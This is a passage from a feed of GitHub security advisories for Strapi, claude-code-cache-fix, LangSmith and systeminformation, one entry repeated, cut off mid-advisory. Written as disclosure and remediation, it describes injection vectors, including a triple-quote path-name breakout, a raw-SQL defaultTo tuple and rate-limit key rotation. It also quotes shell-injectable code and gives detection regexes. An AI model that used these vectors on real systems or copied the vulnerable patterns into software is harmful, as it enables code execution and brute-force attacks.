        <title type="html"><![CDATA[[@strapi/admin] Strapi: Password Reset Does Not Revoke Existing Refresh Sessions]]></title>
        <id>https://github.com/advisories/GHSA-hvp3-26wx-g2w4</id>
        <link href="https://github.com/advisories/GHSA-hvp3-26wx-g2w4"/>
        <updated>2026-05-14T14:58:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-22706-vulnerability-details">Summary of CVE-2026-22706 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-22706</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:H/AT:N/PR:H/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code> (2.1 — Low)</li>
<li>Affected Versions: <code>@strapi/admin</code> and <code>@strapi/plugin-users-permissions</code> &lt;=5.33.2</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.33.3</li>
</ul>
<h3 id="description-of-cve-2026-22706">Description of CVE-2026-22706</h3>
<p>In Strapi versions prior to 5.33.3, changing or resetting a user's password did not invalidate the user's existing refresh-token sessions by default. The refresh-token invalidation step in the users-permissions and admin authentication controllers was conditional on a caller-supplied <code>deviceId</code>. When a password change or reset request did not include a <code>deviceId</code>, no refresh tokens were revoked, leaving every prior session active.</p>
<p>An attacker who had previously obtained a refresh token could continue minting new access tokens after the legitimate user reset their password, allowing persistent unauthorized access for the lifetime of the refresh token (up to 30 days by default). Rotating credentials no longer terminated an active attacker session, defeating password reset as a containment measure.</p>
<p>The patch invalidates all refresh tokens associated with the user on every password change and password reset, regardless of whether a <code>deviceId</code> is supplied. A new device-scoped session is then issued to the caller as part of the response.</p>
<h3 id="iocs-for-cve-2026-22706">IoC's for CVE-2026-22706</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>Successful <code>POST /api/auth/refresh</code> or <code>POST /admin/access-token</code> requests using a refresh token issued before the user's most recent password change. Reviewable by correlating refresh-token <code>iat</code> claims against password-change events in audit logs</li>
<li>New access-token issuances for a user whose password was reset within the past 30 days, originating from an IP or User-Agent that did not perform the reset</li>
<li>Multiple active refresh tokens for a single user across distinct IPs after a password reset event</li>
<li>Database query: rows in <code>strapi_session</code> with <code>created_at</code> earlier than the user's most recent password-reset timestamp and <code>status = 'active'</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>OWASP ASVS 4.0 – V2.1.1: Session invalidation on credential change</li>
<li>OWASP Top 10 – A2: Broken Authentication</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>bugbunny.ai</li>
<li>AndyAnh174 (concurrent report, 2026-04-09 — originally filed as GHSA-c6gj-8rxm-jrf2, closed as duplicate)</li>
<li>Aastha2602 (concurrent report, 2026-03-10 — originally filed as GHSA-5qvg-4jch-gvf4, closed as duplicate)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-hvp3-26wx-g2w4">https://github.com/strapi/strapi/security/advisories/GHSA-hvp3-26wx-g2w4</a></li>
<li><a href="https://github.com/advisories/GHSA-hvp3-26wx-g2w4">https://github.com/advisories/GHSA-hvp3-26wx-g2w4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvp3-26wx-g2w4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-13T20:02:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-content-type-builder] Strapi Vulnerable to SQL Injection in Content Type Builder]]></title>
        <id>https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</id>
        <link href="https://github.com/advisories/GHSA-3xcq-8mjw-h6mx"/>
        <updated>2026-05-13T20:02:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-22599-vulnerability-details">Summary of CVE-2026-22599 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-22599</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N</code> (9.3 — Critical)</li>
<li>Affected Versions: <code>@strapi/content-type-builder</code> &lt;=5.33.1 (v5), <code>@strapi/plugin-content-type-builder</code> &lt;=4.26.0 (v4)</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.33.2 (v5) or &gt;=4.26.1 (v4)</li>
</ul>
<h3 id="description-of-cve-2026-22599">Description of CVE-2026-22599</h3>
<p>A database-query injection vulnerability existed in the Strapi Content-Type Builder write API. An authenticated administrator could inject arbitrary database statements through the <code>column.defaultTo</code> attribute when creating or modifying a content type. Setting <code>defaultTo</code> as a tuple <code>[value, { isRaw: true }]</code> caused the value to be passed directly into Knex's <code>db.connection.raw()</code> during schema migration without sanitization, allowing arbitrary statement execution at the database layer. Depending on the database engine, this enabled arbitrary file read via database utility functions, denial of service via forced server crash on schema-migration error, and on engines that permit external program execution, remote code execution against the database server.</p>
<p>The patch addresses this by restricting all Content-Type Builder write APIs to development mode only. Production deployments running v5.33.2 or later return 404 for requests against <code>/content-type-builder/content-types</code> and related endpoints, removing the network-reachable attack surface entirely.</p>
<h3 id="iocs-for-cve-2026-22599">IoC's for CVE-2026-22599</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>HTTP access logs containing POST or PUT requests to <code>/content-type-builder/content-types</code> from a non-internal source. Regex pattern: <code>(POST|PUT)\s+/content-type-builder/</code></li>
<li>Database server logs containing unexpected DEFAULT clause values that reference filesystem-access or program-execution helper functions of your database engine</li>
<li>Strapi server crashes immediately following a content-type creation or update, observed as the Node process exiting during the schema-migration step</li>
<li>Files appearing under unexpected paths on the database host that match content-type DEFAULT values from the application</li>
<li>Newly-created content-types named or shaped to extract specific data (attribute names like <code>passwd</code>, <code>etc</code>, <code>env</code>, <code>config</code>)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-3xcq-8mjw-h6mx">https://github.com/strapi/strapi/security/advisories/GHSA-3xcq-8mjw-h6mx</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.26.1">https://github.com/strapi/strapi/releases/tag/v4.26.1</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v5.33.2">https://github.com/strapi/strapi/releases/tag/v5.33.2</a></li>
<li><a href="https://github.com/advisories/GHSA-3xcq-8mjw-h6mx">https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-13T20:02:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/content-type-builder] Strapi Vulnerable to SQL Injection in Content Type Builder]]></title>
        <id>https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</id>
        <link href="https://github.com/advisories/GHSA-3xcq-8mjw-h6mx"/>
        <updated>2026-05-13T20:02:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2026-22599-vulnerability-details">Summary of CVE-2026-22599 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2026-22599</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N</code> (9.3 — Critical)</li>
<li>Affected Versions: <code>@strapi/content-type-builder</code> &lt;=5.33.1 (v5), <code>@strapi/plugin-content-type-builder</code> &lt;=4.26.0 (v4)</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.33.2 (v5) or &gt;=4.26.1 (v4)</li>
</ul>
<h3 id="description-of-cve-2026-22599">Description of CVE-2026-22599</h3>
<p>A database-query injection vulnerability existed in the Strapi Content-Type Builder write API. An authenticated administrator could inject arbitrary database statements through the <code>column.defaultTo</code> attribute when creating or modifying a content type. Setting <code>defaultTo</code> as a tuple <code>[value, { isRaw: true }]</code> caused the value to be passed directly into Knex's <code>db.connection.raw()</code> during schema migration without sanitization, allowing arbitrary statement execution at the database layer. Depending on the database engine, this enabled arbitrary file read via database utility functions, denial of service via forced server crash on schema-migration error, and on engines that permit external program execution, remote code execution against the database server.</p>
<p>The patch addresses this by restricting all Content-Type Builder write APIs to development mode only. Production deployments running v5.33.2 or later return 404 for requests against <code>/content-type-builder/content-types</code> and related endpoints, removing the network-reachable attack surface entirely.</p>
<h3 id="iocs-for-cve-2026-22599">IoC's for CVE-2026-22599</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>HTTP access logs containing POST or PUT requests to <code>/content-type-builder/content-types</code> from a non-internal source. Regex pattern: <code>(POST|PUT)\s+/content-type-builder/</code></li>
<li>Database server logs containing unexpected DEFAULT clause values that reference filesystem-access or program-execution helper functions of your database engine</li>
<li>Strapi server crashes immediately following a content-type creation or update, observed as the Node process exiting during the schema-migration step</li>
<li>Files appearing under unexpected paths on the database host that match content-type DEFAULT values from the application</li>
<li>Newly-created content-types named or shaped to extract specific data (attribute names like <code>passwd</code>, <code>etc</code>, <code>env</code>, <code>config</code>)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-3xcq-8mjw-h6mx">https://github.com/strapi/strapi/security/advisories/GHSA-3xcq-8mjw-h6mx</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v4.26.1">https://github.com/strapi/strapi/releases/tag/v4.26.1</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v5.33.2">https://github.com/strapi/strapi/releases/tag/v5.33.2</a></li>
<li><a href="https://github.com/advisories/GHSA-3xcq-8mjw-h6mx">https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xcq-8mjw-h6mx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-13T20:02:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-users-permissions] Strapi has a rate limit bypass on users-permissions plugin via attacker-controlled email keying]]></title>
        <id>https://github.com/advisories/GHSA-7mqx-wwh4-f9fw</id>
        <link href="https://github.com/advisories/GHSA-7mqx-wwh4-f9fw"/>
        <updated>2026-05-13T20:02:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary-of-cve-2025-64526-vulnerability-details">Summary of CVE-2025-64526 Vulnerability Details</h3>
<ul>
<li>CVE: CVE-2025-64526</li>
<li>CVSS v3.1 Vector: <code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code> (6.9 — Medium)</li>
<li>Affected Versions: <code>@strapi/plugin-users-permissions</code> &lt;=5.44.0</li>
<li>How to Patch: Immediately update your Strapi to &gt;=5.45.0</li>
</ul>
<h3 id="description-of-cve-2025-64526">Description of CVE-2025-64526</h3>
<p>In Strapi versions prior to 5.45.0, the rate-limit middleware in the users-permissions plugin derived its rate-limit key in part from <code>ctx.request.body.email</code>, including on routes whose body schema does not contain an <code>email</code> field (<code>/auth/local</code>, <code>/auth/reset-password</code>, <code>/auth/change-password</code>). An unauthenticated attacker could include an arbitrary <code>email</code> value in the request body to obtain a fresh rate-limit key per request, effectively bypassing per-IP throttling on those routes and enabling high-volume credential brute-force, password-reset code brute-force, and credential-stuffing attempts.</p>
<p>The rate-limit key was constructed as <code>${userIdentifier}:${requestPath}:${ctx.request.ip}</code>, where <code>userIdentifier = ctx.request.body.email</code>. On routes that legitimately use email as their identifier (e.g. <code>/auth/forgot-password</code>, <code>/auth/local/register</code>), this scoping is correct. On routes that use a different identifier (<code>identifier</code> for login, <code>code</code> for password reset, <code>currentPassword</code> for password change), the email field was not part of the route contract, but the middleware still incorporated it into the key, allowing a caller to rotate the value and obtain a unique key on every request.</p>
<p>The patch maintains an allow-list of routes that legitimately key on the email field and excludes that key component on every other route the middleware is mounted on. OAuth callback paths (<code>/connect/*</code>) are treated identifier-less. On routes outside the allow-list, the middleware now falls back to a fixed identifier-less key, ensuring per-IP throttling remains effective even when the request body is attacker-controlled.</p>
<h3 id="iocs-for-cve-2025-64526">IoC's for CVE-2025-64526</h3>
<p>Indicators that an instance running an unpatched version may have been exploited:</p>
<ul>
<li>Unusually high volumes of <code>POST</code> requests to <code>/api/auth/local</code>, <code>/api/auth/reset-password</code>, or <code>/api/auth/change-password</code> from a single IP within a 5-minute window without 429 (Too Many Requests) responses</li>
<li>Request bodies on <code>/api/auth/local</code> containing both <code>identifier</code> AND <code>email</code> fields where <code>email</code> varies per request. Body shape regex: <code>"identifier"\s*:\s*"[^"]*",\s*"email"\s*:\s*"[^"]*"</code></li>
<li>Request bodies on <code>/api/auth/reset-password</code> containing an unexpected <code>email</code> field alongside <code>code</code>. Body shape regex: <code>"code"\s*:\s*"[^"]*",.*"email"\s*:</code></li>
<li>Server logs showing many distinct rate-limit key prefixes for the same IP+route combination within the rate-limit window</li>
<li>Successful authentication or password reset following hundreds of preceding 401/400 responses from the same IP</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-7mqx-wwh4-f9fw">https://github.com/strapi/strapi/security/advisories/GHSA-7mqx-wwh4-f9fw</a></li>
<li><a href="https://github.com/strapi/strapi/pull/24818">https://github.com/strapi/strapi/pull/24818</a></li>
<li><a href="https://github.com/strapi/strapi/commit/5e0d243cba9830e6f791de6a94798bcde51468db">https://github.com/strapi/strapi/commit/5e0d243cba9830e6f791de6a94798bcde51468db</a></li>
<li><a href="https://github.com/strapi/strapi/releases/tag/v5.45.0">https://github.com/strapi/strapi/releases/tag/v5.45.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7mqx-wwh4-f9fw">https://github.com/advisories/GHSA-7mqx-wwh4-f9fw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mqx-wwh4-f9fw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-13T20:02:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[claude-code-cache-fix] claude-code-cache-fix vulnerable to local code execution via Python triple-quote injection in tools/quota-statusline.sh]]></title>
        <id>https://github.com/advisories/GHSA-g3xq-3gmv-qq8g</id>
        <link href="https://github.com/advisories/GHSA-g3xq-3gmv-qq8g"/>
        <updated>2026-05-13T15:31:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>tools/quota-statusline.sh</code> (introduced in v3.5.0) interpolates Claude Code's hook stdin payload directly into a Python triple-quoted string literal. A <code>'''</code> byte sequence in any user-controlled field of the payload closes the literal early and lets following bytes execute as Python in the user's Claude Code process.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>v3.5.0</li>
<li>v3.5.1</li>
</ul>
<h2 id="patched-versions">Patched versions</h2>
<ul>
<li>v3.5.2</li>
</ul>
<h2 id="affected-configurations">Affected configurations</h2>
<p>Users who wired <code>tools/quota-statusline.sh</code> into Claude Code's <code>statusLine</code> configuration. The v3.5.0 README explicitly recommends this setup, so most users on v3.5.0/v3.5.1 with the recommended setup are affected.</p>
<h2 id="attack-chain">Attack chain</h2>
<p>Claude Code's statusline hook payload reflects user-controlled paths (<code>cwd</code>, <code>workspace.current_dir</code>, <code>workspace.project_dir</code>, <code>transcript_path</code>). Apostrophes are legal in POSIX filesystem paths.</p>
<ol>
<li>A hostile directory name containing <code>'''+payload+'''</code> lands on disk via any normal vector — <code>git clone</code>, archive extraction, npm package, downloaded zip, etc.</li>
<li>The victim has the recommended <code>tools/quota-statusline.sh</code> wired into their CC <code>statusLine</code> config.</li>
<li>The victim <code>cd</code>s anywhere a hostile path is reachable.</li>
<li>CC fires the statusline hook on every redraw. The Python literal closes early. The injected bytes execute as Python in the user's process.</li>
</ol>
<h2 id="severity">Severity</h2>
<p>Local code execution at user privilege. Persistent re-fire on every statusline redraw. No user interaction beyond <code>cd</code>-ing into the hostile path. The user's shell, CC session, files, SSH keys, and any locally-accessible credentials are reachable from the executed code.</p>
<h2 id="vulnerable-pattern">Vulnerable pattern</h2>
<pre><code class="language-sh">input=$(cat)
result=$(python3 -c "
    stdin_data = json.loads('''$input''') if '''$input''' else {}
")
</code></pre>
<h2 id="fix">Fix</h2>
<p>Capture stdin in bash, export to env, and pipe the Python source through a single-quoted heredoc (<code>&lt;&lt;'PYEOF'</code>). Single-quoting disables ALL bash interpolation inside the body. Python reads the JSON via <code>os.environ.get('CC_INPUT')</code>, where the bytes are inert at every layer.</p>
<pre><code class="language-sh">CC_INPUT=$(cat)
export CC_INPUT

python3 &lt;&lt;'PYEOF' 2&gt;/dev/null
import os, json
try:
    cc_input = json.loads(os.environ.get('CC_INPUT') or '{}')
except Exception:
    cc_input = {}
# ...
PYEOF
</code></pre>
<h2 id="workarounds">Workarounds</h2>
<p>Until upgrading to v3.5.2:</p>
<ul>
<li>Disable the statusline by removing the <code>statusLine</code> entry from <code>~/.claude/settings.json</code>, or</li>
<li>Replace <code>tools/quota-statusline.sh</code> with a script that does NOT pass stdin through <code>python3 -c "..."</code> (a heredoc + env var rewrite is safe)</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reported by Jakob Linke (@schuay) via GitHub issue <a href="https://github.com/cnighswonger/claude-code-cache-fix/issues/108">#108</a>.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>2026-05-07 — reported (#108)</li>
<li>2026-05-07 — confirmed, fix implemented (#110)</li>
<li>2026-05-07 — v3.5.2 published</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cnighswonger/claude-code-cache-fix/security/advisories/GHSA-g3xq-3gmv-qq8g">https://github.com/cnighswonger/claude-code-cache-fix/security/advisories/GHSA-g3xq-3gmv-qq8g</a></li>
<li><a href="https://github.com/cnighswonger/claude-code-cache-fix/issues/108">https://github.com/cnighswonger/claude-code-cache-fix/issues/108</a></li>
<li><a href="https://github.com/cnighswonger/claude-code-cache-fix/pull/110">https://github.com/cnighswonger/claude-code-cache-fix/pull/110</a></li>
<li><a href="https://github.com/cnighswonger/claude-code-cache-fix/commit/613e4df30547f3e6baf32d161eddc828f171da17">https://github.com/cnighswonger/claude-code-cache-fix/commit/613e4df30547f3e6baf32d161eddc828f171da17</a></li>
<li><a href="https://github.com/advisories/GHSA-g3xq-3gmv-qq8g">https://github.com/advisories/GHSA-g3xq-3gmv-qq8g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g3xq-3gmv-qq8g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-13T15:31:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langsmith] LangSmith SDK: Public prompt pull deserializes untrusted manifests without trust boundary warning]]></title>
        <id>https://github.com/advisories/GHSA-3644-q5cj-c5c7</id>
        <link href="https://github.com/advisories/GHSA-3644-q5cj-c5c7"/>
        <updated>2026-05-13T15:29:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LangSmith SDK's prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) fetch and deserialize prompt manifests from the LangSmith Hub. These manifests may contain serialized LangChain objects and model configuration that affect runtime behavior. When pulling a public prompt by <code>owner/name</code> identifier, the manifest content is controlled by an external party, but prior versions of the SDK did not distinguish this from pulling a prompt within the caller's own organization.</p>
<p>Prompt manifests can intentionally configure a model with a custom base URL, default headers, model name, or other constructor arguments. These are supported features, but they also mean the prompt contents should be treated as executable configuration rather than plain text. A prompt can also include serialized LangChain <code>Runnable</code> or <code>PromptTemplate</code> objects with attacker-controlled constructor kwargs, or secret references that, if <code>secrets_from_env</code> is enabled, read environment variables at deserialization time.
Applications are exposed when all of the following are true:</p>
<ul>
<li>The application calls <code>pull_prompt</code> or <code>pull_prompt_commit</code> (Python) or <code>pullPrompt</code> or <code>pullPromptCommit</code> (JS/TS) with a public <code>owner/name</code> prompt identifier.</li>
<li>The prompt was published or modified by an untrusted or compromised account.</li>
<li>The application uses the pulled prompt without independently validating its contents.</li>
</ul>
<p>Applications that only pull prompts from their own organization (referenced by name only, without an <code>owner/</code> prefix) are not affected by the public prompt trust boundary issue described above. However, same-organization prompts carry their own risk. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that is pulled and deserialized without any additional warning.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who publishes a malicious prompt to LangSmith Hub may be able to affect applications that pull that prompt by <code>owner/name</code>. If the prompt manifest reaches the SDK's deserialization path, the SDK will instantiate the referenced LangChain objects with the attacker-supplied constructor arguments rather than treating the manifest as inert data.</p>
<p>Realistic impacts include:</p>
<ul>
<li>Server-side request forgery (SSRF), outbound request redirection, and interception of LLM traffic if a prompt manifest configures an LLM client with an attacker-controlled <code>base_url</code>, proxy, or equivalent endpoint-setting parameter. In typical deployments, redirected requests may include prompt contents, system prompts, retrieved context, model parameters, provider credentials, or other secrets and may disclose them to the attacker-controlled endpoint.</li>
<li>Prompt injection or behavior manipulation if a manifest embeds attacker-controlled system messages, prompt templates, or model parameters that alter the application's behavior.</li>
<li>Additional deserialization risk when <code>include_model=True</code> is passed, because this expands the allowlist to partner integration classes. This is not the default, but it materially increases risk when pulling prompts from outside the caller's organization.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>The LangSmith SDK now blocks pulling public prompts by <code>owner/name</code> by default. Callers must explicitly opt in by passing <code>dangerously_pull_public_prompt=True</code> (Python) or <code>dangerouslyPullPublicPrompt: true</code> (JS/TS) to acknowledge the trust boundary. This flag should only be set after reviewing and trusting the prompt contents, not merely the publishing account.</p>
<p>Upgrade to LangSmith SDK <strong>Python &gt;= 0.8.0</strong> or <strong>JS/TS &gt;= 0.6.0</strong>.</p>
<h3 id="guidance-for-prompt-pull-methods">Guidance for prompt pull methods</h3>
<p>The prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) should be used only with trusted prompts. Do not pull public prompts by <code>owner/name</code> from untrusted or unreviewed sources without understanding that the manifest contents will be deserialized and may affect runtime behavior.</p>
<p>When pulling prompts that include model configuration (<code>include_model=True</code> in Python, <code>includeModel: true</code> in JS/TS), the deserialization allowlist expands to include partner integration classes. Because this mode is not the default and is often unnecessary for third-party prompts, prefer the default (<code>false</code>) when pulling prompts from sources outside your organization.</p>
<p>Avoid passing <code>secrets_from_env=True</code> (Python) when pulling untrusted prompts. This parameter allows prompt manifests to read environment variables during deserialization. Only use it with trusted prompts from your own organization.</p>
<h3 id="same-organization-prompts">Same-organization prompts</h3>
<p>Prompts pulled from the caller's own organization (referenced by name only, without an <code>owner/</code> prefix) are not gated by the new <code>dangerously_pull_public_prompt</code> flag, but they are not inherently safe. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that redirects LLM traffic to attacker-controlled infrastructure and may disclose any credentials attached to those requests.</p>
<p>The security of same-organization prompts follows a shared responsibility model. The LangSmith SDK enforces trust boundaries for public prompts pulled from external accounts, but it cannot protect against compromised credentials or accounts within the caller's own organization. Securing API keys, managing team member access, and reviewing prompt contents before production deployment are the responsibility of the organization. Organizations should treat prompts as executable configuration and apply the same review and audit practices they would apply to application code.</p>
<h2 id="credits">Credits</h2>
<p>First reported by @Moaaz-0x.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7</a></li>
<li><a href="https://github.com/advisories/GHSA-3644-q5cj-c5c7">https://github.com/advisories/GHSA-3644-q5cj-c5c7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3644-q5cj-c5c7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-13T15:29:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[systeminformation] Systeminformation vulnerable to Linux command injection in networkInterfaces() via unsanitized NetworkManager connection profile name]]></title>
        <id>https://github.com/advisories/GHSA-hvx9-hwr7-wjj9</id>
        <link href="https://github.com/advisories/GHSA-hvx9-hwr7-wjj9"/>
        <updated>2026-05-13T15:29:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>On Linux, <code>systeminformation</code> is vulnerable to command injection in <code>networkInterfaces()</code> when an <strong>active NetworkManager connection profile name</strong> contains shell metacharacters.</p>
<p>This is not caused by a caller passing attacker-controlled arguments into <code>networkInterfaces()</code>. The vulnerable value is obtained internally from real <code>nmcli device status</code> output. The library sanitizes the network interface name before using it in shell commands, but it does <strong>not</strong> apply equivalent sanitization to the parsed NetworkManager connection profile name. That unsanitized <code>connectionName</code> is then interpolated into three shell command strings executed through <code>execSync()</code>.</p>
<p>This issue was validated locally against <strong>real NetworkManager</strong> and <strong>real <code>nmcli</code></strong>. Calling only:</p>
<pre><code class="language-js">require('./lib').networkInterfaces()
</code></pre>
<p>was enough to trigger execution. The injected command ran with the privileges of the calling Node.js process.</p>
<h2 id="affected-component--versions">Affected Component &amp; Versions</h2>
<p><strong>Affected component:</strong></p>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js"><code>lib/network.js</code></a></li>
<li><code>networkInterfaces()</code></li>
<li>Linux NetworkManager / <code>nmcli</code> handling</li>
</ul>
<h2 id="impact--threat-model">Impact &amp; Threat Model</h2>
<p><strong>Confirmed impact:</strong></p>
<p>An attacker who can create or rename an <strong>active NetworkManager connection profile</strong> can execute arbitrary shell commands when a Node.js process using <code>systeminformation</code> calls <code>networkInterfaces()</code>.</p>
<p><strong>Confirmed realistic affected deployments include:</strong></p>
<ul>
<li>local inventory agents</li>
<li>monitoring agents</li>
<li>diagnostics tools</li>
<li>admin dashboard backends collecting host information</li>
<li>privileged local desktop or device-management agents</li>
</ul>
<p>If such a process runs with elevated privileges, the injected command executes with those same elevated privileges.</p>
<p><strong>Confirmed facts:</strong></p>
<ul>
<li>The payload was stored as a real NetworkManager connection profile name.</li>
<li>Real <code>nmcli device status</code> returned the name unchanged.</li>
<li><code>networkInterfaces()</code> parsed that value and reused it in shell commands.</li>
<li>The injected command ran as the calling Node.js process.</li>
<li>Environment key categories were reachable from the injected process context.</li>
</ul>
<p><strong>Not claimed:</strong></p>
<ul>
<li>No remote exploitation claim is made.</li>
<li>No <code>AV:N</code> or <code>AV:A</code> claim is made.</li>
<li>No SSID-to-connection-name attack path is claimed.</li>
<li>File-delivery-only <code>.nmconnection</code> import was not confirmed as a remote or unauthenticated path.</li>
</ul>
<h2 id="root-cause-analysis">Root Cause Analysis</h2>
<p>The root cause is inconsistent trust handling between the Linux interface name and the NetworkManager connection profile name.</p>
<p>The interface name is sanitized before it is embedded into shell commands:</p>
<pre><code class="language-js">const iface = dev.split(':')[0].trim();
const s = util.isPrototypePolluted() ? '---' : util.sanitizeShellString(iface);
</code></pre>
<p>However, the NetworkManager connection name is parsed from command output and later reused without equivalent sanitization:</p>
<pre><code class="language-js">const connectionNameLines = resultFormat.split(' ').slice(3);
const connectionName = connectionNameLines.join(' ');
return connectionName !== '--' ? connectionName : '';
</code></pre>
<p>That is unsafe because NetworkManager profile names can contain shell metacharacters. Quoting the value inside <code>"${connectionName}"</code> does not make it safe. A connection name containing <code>"</code>, <code>$()</code>, <code>;</code>, backticks, or similar shell syntax can break out of the intended argument context or trigger command substitution.</p>
<p>The vulnerable code executes through <code>execSync()</code>, which invokes a shell for command strings. As a result, interpolating <code>connectionName</code> into the command string creates a command-injection sink.</p>
<h2 id="exact-code-flow--file-paths">Exact Code Flow &amp; File Paths</h2>
<p><strong>Source:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L538-L544"><code>lib/network.js:538-544</code></a></p>
<pre><code class="language-js">function getLinuxIfaceConnectionName(interfaceName) {
  const cmd = `nmcli device status 2&gt;/dev/null | grep ${interfaceName}`;

  try {
    const result = execSync(cmd, util.execOptsLinux).toString();
    const resultFormat = result.replace(/\s+/g, ' ').trim();
    const connectionNameLines = resultFormat.split(' ').slice(3);
</code></pre>
<p>The parsed value is then returned as <code>connectionName</code>.</p>
<p><strong>Trigger:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L987-L991"><code>lib/network.js:987-991</code></a></p>
<pre><code class="language-js">lines = execSync(cmd, util.execOptsLinux).toString().split('\n');
const connectionName = getLinuxIfaceConnectionName(ifaceSanitized);
dhcp = getLinuxIfaceDHCPstatus(ifaceSanitized, connectionName, _dhcpNics);
dnsSuffix = getLinuxIfaceDNSsuffix(connectionName);
ieee8021xAuth = getLinuxIfaceIEEE8021xAuth(connectionName);
</code></pre>
<p><strong>Sink 1:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L620-L620"><code>lib/network.js:620</code></a></p>
